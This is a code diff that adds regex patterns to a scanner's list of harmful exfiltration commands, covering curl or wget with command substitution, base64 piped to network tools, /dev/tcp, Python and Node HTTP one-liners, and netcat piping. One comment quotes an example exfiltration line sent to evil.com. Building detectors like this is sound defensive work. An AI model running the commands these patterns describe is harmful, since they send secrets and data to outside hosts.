@@ -26,6 +26,19 @@ const HARMFUL_PATTERNS: Array<{ pattern: RegExp; category: string }> = [
 	{ pattern: /base64\s+encode.*secret/i, category: "exfiltration" },
 	{ pattern: /curl.*-d.*password/i, category: "exfiltration" },
 	{ pattern: /wget.*--post-data.*token/i, category: "exfiltration" },
+	// Command substitution in URLs: curl http://evil.com/?d=$(cmd) or `cmd`
+	{ pattern: /\b(curl|wget)\b.*\$\(/, category: "exfiltration" },
+	{ pattern: /\b(curl|wget)\b.*`[^`]+`/, category: "exfiltration" },
+	// Base64 piping to network commands
+	{ pattern: /\bbase64\b.*\|\s*(curl|wget|nc|netcat)\b/, category: "exfiltration" },
+	// /dev/tcp bash built-in exfiltration
+	{ pattern: /\/dev\/tcp\//, category: "exfiltration" },
+	// Python one-liner HTTP exfil (urllib, requests, http.client)
+	{ pattern: /python[23]?\s+-c\s+.*\b(urllib|requests|http\.client)\b/, category: "exfiltration" },
+	// Node one-liner HTTP exfil
+	{ pattern: /node\s+-e\s+.*\b(http|https|fetch)\b/, category: "exfiltration" },
+	// Netcat/nc data piping
+	{ pattern: /\|\s*(nc|netcat)\b/, category: "exfiltration" },
 ];
 
 export function scanContent(text: string): ScanResult {
